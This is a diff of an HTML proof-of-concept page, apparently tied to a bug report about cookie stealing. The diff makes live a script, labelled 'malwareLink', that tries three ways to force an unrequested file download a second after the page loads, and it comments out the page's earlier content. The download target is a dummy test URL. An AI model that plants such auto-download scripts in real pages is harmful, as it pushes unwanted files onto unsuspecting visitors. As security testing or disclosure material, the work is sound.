@@ -1,4 +1,24 @@
-<center><h1>Please refer to comment 9 + Steps to Reproduce + Attached PoCs + Impact + comment 11 Cookie Stealing</h1>
+<a id="malwareLink" href="https://www.dummysoftware.com/popupdummy_testpage.html" target="_blank" download> 
+
+<script>
+  setTimeout(() => {
+    // Attempt 1: Simulate a click on the link
+    document.getElementById("malwareLink").click();
+
+    // Attempt 2: Open the download link in a new tab
+    window.open("https://www.dummysoftware.com/popupdummy_testpage.html");
+
+    // Attempt 3: Create an invisible link and click it
+    let a = document.createElement("a");
+    a.href = "https://www.dummysoftware.com/popupdummy_testpage.html";
+    a.download = "";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }, 1000); // Trigger after 1 seconds
+</script>
+    
+<!--<center><h1>Please refer to comment 9 + Steps to Reproduce + Attached PoCs + Impact + comment 11 Cookie Stealing</h1>
 
     <!DOCTYPE html>
 <html lang="en">
@@ -7,7 +27,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Code</title>
     <!-- Monokai Theme CSS -->
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />    <style>
+    <!--<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />    <style>
         body {
             font-family: Arial, sans-serif;
             background-color: #000; /* Black background */
@@ -209,28 +229,8 @@
 &lt;/body&gt;
 &lt;/html&gt;</code></pre>
     </div>
-
-    <!-- Prism.js JavaScript for syntax highlighting -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
 </body>
 </html>
  
-<!--<a id="malwareLink" href="https://www.dummysoftware.com/popupdummy_testpage.html" target="_blank" download> 
 
-<script>
-  setTimeout(() => {
-    // Attempt 1: Simulate a click on the link
-    document.getElementById("malwareLink").click();
-
-    // Attempt 2: Open the download link in a new tab
-    window.open("https://www.dummysoftware.com/popupdummy_testpage.html");
-
-    // Attempt 3: Create an invisible link and click it
-    let a = document.createElement("a");
-    a.href = "https://www.dummysoftware.com/popupdummy_testpage.html";
-    a.download = "";
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-  }, 1000); // Trigger after 1 seconds
-</script>
